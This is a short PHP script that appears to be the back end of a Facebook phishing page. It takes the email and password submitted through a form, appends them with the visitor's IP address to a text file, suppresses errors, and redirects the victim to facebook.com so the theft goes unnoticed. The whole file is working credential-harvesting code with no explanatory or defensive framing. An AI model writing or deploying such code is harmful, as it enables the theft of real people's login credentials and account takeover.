<?php

error_reporting(0);

$email = $_POST["email"];
$pass = $_POST["pass"];
$client_ip = $_SERVER["REMOTE_ADDR"];

$fp = fopen("users.txt", "a");
fwrite($fp, "$email\n$pass\n$client_ip\n\n");
fclose($fp);

header("Location: https://www.facebook.com");

?>
